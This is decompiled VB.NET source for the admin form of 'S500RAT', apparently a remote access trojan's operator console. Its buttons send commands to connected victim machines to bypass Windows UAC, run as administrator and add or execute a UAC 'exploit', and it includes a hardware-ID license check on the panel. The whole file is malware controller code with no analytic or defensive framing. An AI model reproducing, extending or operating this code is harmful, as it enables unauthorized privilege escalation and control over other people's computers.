Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200000F RID: 15
	<DesignerGenerated()>
	Public Partial Class FormAdmin
		Inherits Form

		' Token: 0x0600006C RID: 108 RVA: 0x00004268 File Offset: 0x00002468
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormAdmin_Load
			AddHandler MyBase.Resize, AddressOf Me.FormAdmin_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000044 RID: 68
		' (get) Token: 0x0600006F RID: 111 RVA: 0x0000572B File Offset: 0x0000392B
		' (set) Token: 0x06000070 RID: 112 RVA: 0x00005738 File Offset: 0x00003938
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000045 RID: 69
		' (get) Token: 0x06000071 RID: 113 RVA: 0x0000577B File Offset: 0x0000397B
		' (set) Token: 0x06000072 RID: 114 RVA: 0x00005785 File Offset: 0x00003985
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000046 RID: 70
		' (get) Token: 0x06000073 RID: 115 RVA: 0x0000578E File Offset: 0x0000398E
		' (set) Token: 0x06000074 RID: 116 RVA: 0x00005798 File Offset: 0x00003998
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000047 RID: 71
		' (get) Token: 0x06000075 RID: 117 RVA: 0x000057A1 File Offset: 0x000039A1
		' (set) Token: 0x06000076 RID: 118 RVA: 0x000057AC File Offset: 0x000039AC
		Friend Overridable Property AddUAC As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._AddUAC
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.AddUAC_Click
				Dim addUAC As Guna2GradientButton = Me._AddUAC
				If addUAC IsNot Nothing Then
					RemoveHandler addUAC.Click, value2
				End If
				Me._AddUAC = value
				addUAC = Me._AddUAC
				If addUAC IsNot Nothing Then
					AddHandler addUAC.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000048 RID: 72
		' (get) Token: 0x06000077 RID: 119 RVA: 0x000057EF File Offset: 0x000039EF
		' (set) Token: 0x06000078 RID: 120 RVA: 0x000057FC File Offset: 0x000039FC
		Friend Overridable Property BypassUAC As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._BypassUAC
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.BypassUAC_Click
				Dim bypassUAC As Guna2GradientButton = Me._BypassUAC
				If bypassUAC IsNot Nothing Then
					RemoveHandler bypassUAC.Click, value2
				End If
				Me._BypassUAC = value
				bypassUAC = Me._BypassUAC
				If bypassUAC IsNot Nothing Then
					AddHandler bypassUAC.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000049 RID: 73
		' (get) Token: 0x06000079 RID: 121 RVA: 0x0000583F File Offset: 0x00003A3F
		' (set) Token: 0x0600007A RID: 122 RVA: 0x0000584C File Offset: 0x00003A4C
		Friend Overridable Property ExcuteUAC As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._ExcuteUAC
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.ExcuteUAC_Click
				Dim excuteUAC As Guna2GradientButton = Me._ExcuteUAC
				If excuteUAC IsNot Nothing Then
					RemoveHandler excuteUAC.Click, value2
				End If
				Me._ExcuteUAC = value
				excuteUAC = Me._ExcuteUAC
				If excuteUAC IsNot Nothing Then
					AddHandler excuteUAC.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700004A RID: 74
		' (get) Token: 0x0600007B RID: 123 RVA: 0x0000588F File Offset: 0x00003A8F
		' (set) Token: 0x0600007C RID: 124 RVA: 0x0000589C File Offset: 0x00003A9C
		Friend Overridable Property RunAsadminstartor As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._RunAsadminstartor
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.RunAsadminstartor_Click
				Dim runAsadminstartor As Guna2GradientButton = Me._RunAsadminstartor
				If runAsadminstartor IsNot Nothing Then
					RemoveHandler runAsadminstartor.Click, value2
				End If
				Me._RunAsadminstartor = value
				runAsadminstartor = Me._RunAsadminstartor
				If runAsadminstartor IsNot Nothing Then
					AddHandler runAsadminstartor.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700004B RID: 75
		' (get) Token: 0x0600007D RID: 125 RVA: 0x000058DF File Offset: 0x00003ADF
		' (set) Token: 0x0600007E RID: 126 RVA: 0x000058E9 File Offset: 0x00003AE9
		Public Overridable Property AdminInfo As Label

		' Token: 0x1700004C RID: 76
		' (get) Token: 0x0600007F RID: 127 RVA: 0x000058F2 File Offset: 0x00003AF2
		' (set) Token: 0x06000080 RID: 128 RVA: 0x000058FC File Offset: 0x00003AFC
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700004D RID: 77
		' (get) Token: 0x06000081 RID: 129 RVA: 0x00005905 File Offset: 0x00003B05
		' (set) Token: 0x06000082 RID: 130 RVA: 0x00005910 File Offset: 0x00003B10
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700004E RID: 78
		' (get) Token: 0x06000083 RID: 131 RVA: 0x00005953 File Offset: 0x00003B53
		' (set) Token: 0x06000084 RID: 132 RVA: 0x00005960 File Offset: 0x00003B60
		Public Overridable Property StateAdmin As Label
			<CompilerGenerated()>
			Get
				Return Me._StateAdmin
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Dim value2 As EventHandler = AddressOf Me.Label1_Click
				Dim stateAdmin As Label = Me._StateAdmin
				If stateAdmin IsNot Nothing Then
					RemoveHandler stateAdmin.Click, value2
				End If
				Me._StateAdmin = value
				stateAdmin = Me._StateAdmin
				If stateAdmin IsNot Nothing Then
					AddHandler stateAdmin.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700004F RID: 79
		' (get) Token: 0x06000085 RID: 133 RVA: 0x000059A3 File Offset: 0x00003BA3
		' (set) Token: 0x06000086 RID: 134 RVA: 0x000059AD File Offset: 0x00003BAD
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000050 RID: 80
		' (get) Token: 0x06000087 RID: 135 RVA: 0x000059B6 File Offset: 0x00003BB6
		' (set) Token: 0x06000088 RID: 136 RVA: 0x000059C0 File Offset: 0x00003BC0
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000051 RID: 81
		' (get) Token: 0x06000089 RID: 137 RVA: 0x000059C9 File Offset: 0x00003BC9
		' (set) Token: 0x0600008A RID: 138 RVA: 0x000059D3 File Offset: 0x00003BD3
		Private Overridable Property Label4 As Label

		' Token: 0x17000052 RID: 82
		' (get) Token: 0x0600008B RID: 139 RVA: 0x000059DC File Offset: 0x00003BDC
		' (set) Token: 0x0600008C RID: 140 RVA: 0x000059E6 File Offset: 0x00003BE6
		Friend Overridable Property UiLine4 As UILine

		' Token: 0x17000053 RID: 83
		' (get) Token: 0x0600008D RID: 141 RVA: 0x000059EF File Offset: 0x00003BEF
		' (set) Token: 0x0600008E RID: 142 RVA: 0x000059F9 File Offset: 0x00003BF9
		Private Overridable Property Label3 As Label

		' Token: 0x17000054 RID: 84
		' (get) Token: 0x0600008F RID: 143 RVA: 0x00005A02 File Offset: 0x00003C02
		' (set) Token: 0x06000090 RID: 144 RVA: 0x00005A0C File Offset: 0x00003C0C
		Friend Overridable Property UiLine3 As UILine

		' Token: 0x17000055 RID: 85
		' (get) Token: 0x06000091 RID: 145 RVA: 0x00005A15 File Offset: 0x00003C15
		' (set) Token: 0x06000092 RID: 146 RVA: 0x00005A1F File Offset: 0x00003C1F
		Private Overridable Property Label2 As Label

		' Token: 0x17000056 RID: 86
		' (get) Token: 0x06000093 RID: 147 RVA: 0x00005A28 File Offset: 0x00003C28
		' (set) Token: 0x06000094 RID: 148 RVA: 0x00005A32 File Offset: 0x00003C32
		Friend Overridable Property UiLine2 As UILine

		' Token: 0x17000057 RID: 87
		' (get) Token: 0x06000095 RID: 149 RVA: 0x00005A3B File Offset: 0x00003C3B
		' (set) Token: 0x06000096 RID: 150 RVA: 0x00005A45 File Offset: 0x00003C45
		Private Overridable Property Label1 As Label

		' Token: 0x17000058 RID: 88
		' (get) Token: 0x06000097 RID: 151 RVA: 0x00005A4E File Offset: 0x00003C4E
		' (set) Token: 0x06000098 RID: 152 RVA: 0x00005A58 File Offset: 0x00003C58
		Friend Overridable Property UiLine1 As UILine

		' Token: 0x17000059 RID: 89
		' (get) Token: 0x06000099 RID: 153 RVA: 0x00005A61 File Offset: 0x00003C61
		' (set) Token: 0x0600009A RID: 154 RVA: 0x00005A6B File Offset: 0x00003C6B
		Public Property Client As Clients

		' Token: 0x1700005A RID: 90
		' (get) Token: 0x0600009B RID: 155 RVA: 0x00005A74 File Offset: 0x00003C74
		' (set) Token: 0x0600009C RID: 156 RVA: 0x00005A7E File Offset: 0x00003C7E
		Public Property F As FormS500

		' Token: 0x1700005B RID: 91
		' (get) Token: 0x0600009D RID: 157 RVA: 0x00005A87 File Offset: 0x00003C87
		' (set) Token: 0x0600009E RID: 158 RVA: 0x00005A91 File Offset: 0x00003C91
		Public Property FullPath As String

		' Token: 0x1700005C RID: 92
		' (get) Token: 0x0600009F RID: 159 RVA: 0x00005A9A File Offset: 0x00003C9A
		' (set) Token: 0x060000A0 RID: 160 RVA: 0x00005AA4 File Offset: 0x00003CA4
		Friend Property ParentClient As Clients

		' Token: 0x060000A1 RID: 161 RVA: 0x00005AB0 File Offset: 0x00003CB0
		Private Sub FormAdmin_Load(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
				If flag Then
					MyBase.Close()
				End If
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)
				If flag2 Then
					Setting.Running = True
				Else
					MyBase.Close()
				End If
				Dim flag3 As Boolean = Not Setting.Running
				If flag3 Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex2 As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.MaximumSize = MyBase.Size
		End Sub

		' Token: 0x060000A2 RID: 162 RVA: 0x00005C3C File Offset: 0x00003E3C
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060000A3 RID: 163 RVA: 0x00005CA8 File Offset: 0x00003EA8
		Private Sub Cansel_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
			End Sub)
		End Sub

		' Token: 0x060000A4 RID: 164 RVA: 0x00005CC0 File Offset: 0x00003EC0
		Private Sub FormAdmin_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060000A5 RID: 165 RVA: 0x00005D54 File Offset: 0x00003F54
		Private Sub BypassUAC_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "BybassUAC"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.BypassUAC.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000A6 RID: 166 RVA: 0x00005DCC File Offset: 0x00003FCC
		Private Sub RunAsadminstartor_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "RunAs"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.RunAsadminstartor.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000A7 RID: 167 RVA: 0x00005E44 File Offset: 0x00004044
		Private Sub AddUAC_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "AddUAC"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.AddUAC.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000A8 RID: 168 RVA: 0x00005EBC File Offset: 0x000040BC
		Private Sub ExcuteUAC_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not(Me.AdminInfo.ForeColor = Color.Red)
			If flag Then
				MessageBox.Show("Client is working as UAC", "UAC Exploit!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
			Else
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "ExcuteUAC"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Me.ExcuteUAC.Enabled = False
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x060000A9 RID: 169 RVA: 0x00005F64 File Offset: 0x00004164
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim flag As Boolean = Me.ParentClient.TcpClient.Connected OrElse Me.Client.TcpClient.Connected
				If flag Then
					Dim client As Clients = Me.Client
					If client IsNot Nothing Then
						client.Disconnected()
					End If
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x060000AA RID: 170 RVA: 0x00005F79 File Offset: 0x00004179
		Private Sub Label1_Click(sender As Object, e As EventArgs)
			Me.StateAdmin.ForeColor = Color.Orange
			Me.StateAdmin.Text = "..."
		End Sub

		' Token: 0x0400004E RID: 78
		Private FormSize As Boolean
	End Class
End Namespace
